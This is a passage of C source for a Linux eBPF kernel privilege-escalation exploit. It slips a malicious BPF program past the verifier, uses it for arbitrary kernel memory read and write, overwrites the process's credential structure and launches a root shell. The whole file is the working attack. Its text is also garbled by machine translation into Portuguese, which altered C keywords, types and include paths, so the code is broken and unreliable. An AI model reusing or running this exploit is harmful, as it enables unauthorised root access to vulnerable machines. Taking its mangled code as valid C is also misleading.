* /
 
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux / bpf.h>
#include <linux / unistd.h>
#include <sys / mman.h>
#include <sys / types.h>
#include <sys / socket.h>
#include <sys / un.h>
#include <sys / stat.h>
#include <sys / personalidade.h>
 
buffer char [64];
soquetes internos [2];
int mapfd, progfd;
int doredact = 0;
 
#define LOG_BUF_SIZE 65536
#define PHYS_OFFSET 0xffff880000000000
char bpf_log_buf [LOG_BUF_SIZE];
 
static __u64 ptr_to_u64 (void * ptr)
{
    return (__u64) (longo sem sinal) ptr;
}
 
int bpf_prog_load (enum bpf_prog_type prog_type,
          const struct bpf_insn * insns, int prog_len,
          licença const char *, int kern_version)
{
    união bpf_attr attr = {
        .prog_type = prog_type,
        .insns = ptr_to_u64 ((void *) insns),
        .insn_cnt = prog_len / sizeof (struct bpf_insn),
        .license = ptr_to_u64 ((nulo *) licença),
        .log_buf = ptr_to_u64 (bpf_log_buf),
        .log_size = LOG_BUF_SIZE,
        .log_level = 1,
    };
 
    attr.kern_version = kern_version;
 
    bpf_log_buf [0] = 0;
 
    retornar syscall (__ NR_bpf, BPF_PROG_LOAD, & attr, sizeof (attr));
}
 
int bpf_create_map (enum bpf_map_type map_type, int key_size, int value_size,
           int max_entries, int map_flags)
{
    união bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries
    };
 
    retornar syscall (__ NR_bpf, BPF_MAP_CREATE, & attr, sizeof (attr));
}
 
int bpf_update_elem (int fd, void * key, void * value, unsigned long flags)
{
    união bpf_attr attr = {
        .map_fd = fd,
        .key = ptr_to_u64 (chave),
        .value = ptr_to_u64 (valor),
        .flags = sinalizadores,
    };
 
    retornar syscall (__ NR_bpf, BPF_MAP_UPDATE_ELEM, & attr, sizeof (attr));
}
 
int bpf_lookup_elem (int fd, void * chave, void * valor)
{
    união bpf_attr attr = {
        .map_fd = fd,
        .key = ptr_to_u64 (chave),
        .value = ptr_to_u64 (valor),
    };
 
    retornar syscall (__ NR_bpf, BPF_MAP_LOOKUP_ELEM, & attr, sizeof (attr));
}
 
#define BPF_ALU64_IMM (OP, DST, IMM) \
    ((struct bpf_insn) {\
        .code = BPF_ALU64 | BPF_OP (OP) | BPF_K, \
        .dst_reg = DST, \
        .src_reg = 0, \
        .off = 0, \
        .imm = IMM})
 
#define BPF_MOV64_REG (DST, SRC) \
    ((struct bpf_insn) {\
        .code = BPF_ALU64 | BPF_MOV | BPF_X, \
        .dst_reg = DST, \
        .src_reg = SRC, \
        .off = 0, \
        .imm = 0})
 
#define BPF_MOV32_REG (DST, SRC) \
    ((struct bpf_insn) {\
        .code = BPF_ALU | BPF_MOV | BPF_X, \
        .dst_reg = DST, \
        .src_reg = SRC, \
        .off = 0, \
        .imm = 0})
 
#define BPF_MOV64_IMM (DST, IMM) \
    ((struct bpf_insn) {\
        .code = BPF_ALU64 | BPF_MOV | BPF_K, \
        .dst_reg = DST, \
        .src_reg = 0, \
        .off = 0, \
        .imm = IMM})
 
#define BPF_MOV32_IMM (DST, IMM) \
    ((struct bpf_insn) {\
        .code = BPF_ALU | BPF_MOV | BPF_K, \
        .dst_reg = DST, \
        .src_reg = 0, \
        .off = 0, \
        .imm = IMM})
 
#define BPF_LD_IMM64 (DST, IMM) \
    BPF_LD_IMM64_RAW (DST, 0, IMM)
 
#define BPF_LD_IMM64_RAW (DST, SRC, IMM) \
    ((struct bpf_insn) {\
        .code = BPF_LD | BPF_DW | BPF_IMM, \
        .dst_reg = DST, \
        .src_reg = SRC, \
        .off = 0, \
        .imm = (__u32) (IMM)}), \
    ((struct bpf_insn) {\
        .code = 0, \
        .dst_reg = 0, \
        .src_reg = 0, \
        .off = 0, \
        .imm = ((__u64) (IMM)) >> 32})
 
#ifndef BPF_PSEUDO_MAP_FD
# define BPF_PSEUDO_MAP_FD 1
#fim se
 
#define BPF_LD_MAP_FD (DST, MAP_FD) \
    BPF_LD_IMM64_RAW (DST, BPF_PSEUDO_MAP_FD, MAP_FD)
 
#define BPF_LDX_MEM (SIZE, DST, SRC, OFF) \
    ((struct bpf_insn) {\
        .code = BPF_LDX | BPF_SIZE (SIZE) | BPF_MEM, \
        .dst_reg = DST, \
        .src_reg = SRC, \
        .off = OFF, \
        .imm = 0})
 
#define BPF_STX_MEM (SIZE, DST, SRC, OFF) \
    ((struct bpf_insn) {\
        .code = BPF_STX | BPF_SIZE (SIZE) | BPF_MEM, \
        .dst_reg = DST, \
        .src_reg = SRC, \
        .off = OFF, \
        .imm = 0})
 
#define BPF_ST_MEM (SIZE, DST, OFF, IMM) \
    ((struct bpf_insn) {\
        .code = BPF_ST | BPF_SIZE (SIZE) | BPF_MEM, \
        .dst_reg = DST, \
        .src_reg = 0, \
        .off = OFF, \
        .imm = IMM})
 
#define BPF_JMP_IMM (OP, DST, IMM, OFF) \
    ((struct bpf_insn) {\
        .code = BPF_JMP | BPF_OP (OP) | BPF_K, \
        .dst_reg = DST, \
        .src_reg = 0, \
        .off = OFF, \
        .imm = IMM})
 
#define BPF_RAW_INSN (CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn) {\
        .code = CODE, \
        .dst_reg = DST, \
        .src_reg = SRC, \
        .off = OFF, \
        .imm = IMM})
 
#define BPF_EXIT_INSN () \
    ((struct bpf_insn) {\
        .code = BPF_JMP | BPF_EXIT, \
        .dst_reg = 0, \
        .src_reg = 0, \
        .off = 0, \
        .imm = 0})
 
#define BPF_DISABLE_VERIFIER () \
    BPF_MOV32_IMM (BPF_REG_2, 0xFFFFFFFF), / * r2 = (u32) 0xFFFFFFFF * / \
    BPF_JMP_IMM (BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2), / * if (r2 == -1) {* / \
    BPF_MOV64_IMM (BPF_REG_0, 0), / * saída (0); * / \
    BPF_EXIT_INSN () / *} * / \
 
#define BPF_MAP_GET (idx, dst) \
    BPF_MOV64_REG (BPF_REG_1, BPF_REG_9), / * r1 = r9 * / \
    BPF_MOV64_REG (BPF_REG_2, BPF_REG_10), / * r2 = fp * / \
    BPF_ALU64_IMM (BPF_ADD, BPF_REG_2, -4), / * r2 = fp - 4 * / \
    BPF_ST_MEM (BPF_W, BPF_REG_10, -4, idx), / * * (u32 *) (fp - 4) = idx * / \
    BPF_RAW_INSN (BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
    BPF_JMP_IMM (BPF_JNE, BPF_REG_0, 0, 1), / * if (r0 == 0) * / \
    BPF_EXIT_INSN (), / * saída (0); * / \
    BPF_LDX_MEM (BPF_DW, (dst), BPF_REG_0, 0) / * r_dst = * (u64 *) (r0) * /             
 
static int load_prog () {
    struct bpf_insn prog [] = {
        BPF_DISABLE_VERIFIER (),
 
        BPF_STX_MEM (BPF_DW, BPF_REG_10, BPF_REG_1, -16), / * * (fp - 16) = r1 * /
 
        BPF_LD_MAP_FD (BPF_REG_9, mapfd),
 
        BPF_MAP_GET (0, BPF_REG_6), / * r6 = op * /
        BPF_MAP_GET (1, BPF_REG_7), / * r7 = endereço * /
        BPF_MAP_GET (2, BPF_REG_8), / * r8 = valor * /
 
        / * armazenar o endereço do slot do mapa em r2 * /
        BPF_MOV64_REG (BPF_REG_2, BPF_REG_0), / * r2 = r0 * /
        BPF_MOV64_IMM (BPF_REG_0, 0), / * r0 = 0 para saída (0) * /
 
        BPF_JMP_IMM (BPF_JNE, BPF_REG_6, 0, 2), / * if (op == 0) * /
        / * get fp * /
        BPF_STX_MEM (BPF_DW, BPF_REG_2, BPF_REG_10, 0),
        BPF_EXIT_INSN (),
 
        BPF_JMP_IMM (BPF_JNE, BPF_REG_6, 1, 3), / * else if (op == 1) * /
        / * get skbuff * /
        BPF_LDX_MEM (BPF_DW, BPF_REG_3, BPF_REG_10, -16),
        BPF_STX_MEM (BPF_DW, BPF_REG_2, BPF_REG_3, 0),
        BPF_EXIT_INSN (),
 
        BPF_JMP_IMM (BPF_JNE, BPF_REG_6, 2, 3), / * else if (op == 2) * /
        /* leitura */
        BPF_LDX_MEM (BPF_DW, BPF_REG_3, BPF_REG_7, 0),
        BPF_STX_MEM (BPF_DW, BPF_REG_2, BPF_REG_3, 0),
        BPF_EXIT_INSN (),
        /* senão */
        /* Escreva */
        BPF_STX_MEM (BPF_DW, BPF_REG_7, BPF_REG_8, 0), 
        BPF_EXIT_INSN (),
 
    };
    retornar bpf_prog_load (BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof (prog), "GPL", 0);
}
 
void info (const char * fmt, ...) {
    va_list args;
    va_start (args, fmt);
    fprintf (stdout, "[.]");
    vfprintf (stdout, fmt, args);
    va_end (args);
}
 
void msg (const char * fmt, ...) {
    va_list args;
    va_start (args, fmt);
    fprintf (stdout, "[*]");
    vfprintf (stdout, fmt, args);
    va_end (args);
}
 
void redact (const char * fmt, ...) {
    va_list args;
    va_start (args, fmt);
    if (doredact) {
        fprintf (stdout, "[!] ((REMODELADO)) \ n");
        Retorna;
    }
    fprintf (stdout, "[*]");
    vfprintf (stdout, fmt, args);
    va_end (args);
}
 
void fail (const char * fmt, ...) {
    va_list args;
    va_start (args, fmt);
    fprintf (stdout, "[!]");
    vfprintf (stdout, fmt, args);
    va_end (args);
    saída (1);
}
 
vazio
initialize () {
    info ("\ n");
    info ("t (-_- t) exploit para kernels grsec falsificados, como KSPP e linux-hardened t (-_- t) \ n");
    info ("\ n");
    info ("** Esta vulnerabilidade não pode ser explorada em kernel grsecurity autêntico ** \ n");
    info ("\ n");
 
    redact ("criando mapa bpf \ n");
    mapfd = bpf_create_map (BPF_MAP_TYPE_ARRAY, sizeof (int), sizeof (long long), 3, 0);
    if (mapfd <0) {
        fail ("falha ao criar o mapa bpf: '% s' \ n", strerror (errno));
    }
 
    redigir ("passar furtivamente bpf mal pelo verificador \ n");
    progfd = load_prog ();
    if (progfd <0) {
        if (errno == EACCES) {
            msg ("log: \ n% s", bpf_log_buf);
        }
        fail ("falha ao carregar prog '% s' \ n", strerror (errno));
    }
 
    redact ("criando socketpair () \ n");
    if (socketpair (AF_UNIX, SOCK_DGRAM, 0, sockets)) {
        fail ("falha ao criar o par de soquetes '% s' \ n", strerror (errno));
    }
 
    redact ("anexando backdoor bpf ao soquete \ n");
    if (setsockopt (sockets [1], SOL_SOCKET, SO_ATTACH_BPF, & progfd, sizeof (progfd)) <0) {
        fail ("setsockopt '% s' \ n", strerror (errno));
    }
}
 
static void writeemsg () {
    ssize_t n = escrever (sockets [0], buffer, sizeof (buffer));
    if (n <0) {
        perror ("escrever");
        Retorna;
    }
    if (n! = sizeof (buffer)) {
        fprintf (stderr, "escrita curta:% zd \ n", n);
    }
}
 
vazio estático
update_elem (chave int, valor longo sem sinal) {
    if (bpf_update_elem (mapfd, & key, & value, 0)) {
        fail ("bpf_update_elem falhou '% s' \ n", strerror (errno));
    }
}
 
estático sem sinal longo
get_value (int key) {
    valor longo sem sinal;
    if (bpf_lookup_elem (mapfd, & chave, & valor)) {
        fail ("bpf_lookup_elem falhou '% s' \ n", strerror (errno));
    }
    valor de retorno;
}
 
estático sem sinal longo
sendcmd (op longo sem sinal, addr longo sem sinal, valor longo sem sinal) {
    update_elem (0, op);
    update_elem (1, addr);
    update_elem (2, valor);
    writeemsg ();
    return get_value (2);
}
 
longo sem sinal
get_skbuff () {
    retornar sendcmd (1, 0, 0);
}
 
longo sem sinal
get_fp () {
    retornar sendcmd (0, 0, 0);
}
 
longo sem sinal
read64 (endereço longo sem sinal) {
    retornar sendcmd (2, addr, 0);
}
 
vazio
write64 (endereço longo não assinado, val longo não assinado) {
    (vazio) sendcmd (3, addr, val);
}
 
static unsigned long find_cred () {
    uid_t uid = getuid ();
    skbuff longo sem sinal = get_skbuff ();
    / *
     * struct sk_buff {
     * [... deslocamento de 24 bytes ...]
     * struct sock * sk;
     *};
     *
     * /
 
    sock_addr longo sem sinal = read64 (skbuff + 24);
    msg ("skbuff =>% llx \ n", skbuff);
    msg ("Vazando estrutura de meia de% llx \ n", sock_addr);  
    if (sock_addr <PHYS_OFFSET) {
        fail ("Falha ao encontrar o endereço Sock de sk_buff. \ n");
    }   
         
    / *
     * avance para o valor sk_rcvtimeo esperado.
     *
     * struct sock {
     * [...]
     * const struct cred * sk_peer_cred; 
     * long sk_rcvtimeo;             
     *};
     * /
    para (int i = 0; i <100; i ++, sock_addr + = 8) {
        if (read64 (sock_addr) == 0x7FFFFFFFFFFFFFFF) {
            longo sem sinal cred_struct = read64 (sock_addr - 8);
            if (cred_struct <PHYS_OFFSET) {
                Prosseguir;
            }
             
            teste_uid longo sem sinal = (read64 (cred_struct + 8) & 0xFFFFFFFF);
             
            if (test_uid! = uid) {
                Prosseguir;
            }
                        msg ("Sock-> sk_rcvtimeo no deslocamento% d \ n", i * 8);
                        msg ("Estrutura de crédito em% llx \ n", cred_struct);
            msg ("UID da estrutura de crédito:% d, corresponde ao atual:% d \ n", test_uid, uid);
             
            return cred_struct;
        }
    }
    fail ("falha em encontrar sk_rcvtimeo. \ n");
}
 
vazio estático
hammer_cred (endereço longo sem sinal) {
    msg ("martelando a estrutura de crédito em% llx \ n", addr);
# define w64 (w) {write64 (addr, (w)); addr + = 8; }
    val longo sem sinal = read64 (addr) & 0xFFFFFFFFUL;
    w64 (val); 
    w64 (0); w64 (0); w64 (0); w64 (0);
    w64 (0xFFFFFFFFFFFFFFFF); 
    w64 (0xFFFFFFFFFFFFFFFF); 
    w64 (0xFFFFFFFFFFFFFFFF); 
#undef w64
}
 
int
main (int argc, char ** argv) {
    inicializar();
    hammer_cred (find_cred ());
    msg ("credenciais corrigidas, iniciando shell ... \ n");
    if (execl ("/ bin / sh", "/ bin / sh", NULL)) {
        fail ("exec% s \ n", strerror (errno));
    }
}


